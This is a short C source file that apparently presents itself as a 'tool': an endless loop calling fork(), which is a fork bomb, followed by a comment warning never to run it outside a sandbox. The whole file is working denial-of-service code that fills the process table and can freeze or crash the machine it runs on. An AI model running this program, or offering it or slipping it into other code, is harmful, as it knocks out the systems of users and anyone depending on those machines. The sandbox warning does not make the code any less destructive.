#include <unistd.h>
#include <stdio.h>

int main () {
	while (1) {
	fork(); {
}
	}
	return 0;
}

/** Never run this tool without a proper sandbox **/
